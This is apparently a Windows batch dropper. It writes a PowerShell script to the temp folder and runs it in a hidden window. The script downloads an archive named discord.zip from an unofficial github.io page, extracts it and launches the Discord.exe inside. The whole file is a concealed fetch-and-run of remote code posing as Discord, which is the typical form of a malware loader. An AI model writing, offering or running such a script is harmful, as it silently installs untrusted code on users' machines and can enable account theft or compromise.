cd %temp%
echo "cd %temp%; mkdir pstemp; cd pstemp; Invoke-WebRequest -URI themasterkitty.github.io/randomstuffidk/discord.zip -OutFile discord.zip; Expand-Archive -Path discord.zip -DestinationPath discord; cd discord; start Discord.exe; exit" > run.ps1
powershell.exe -windowstyle hidden -file %temp%\run.ps1 
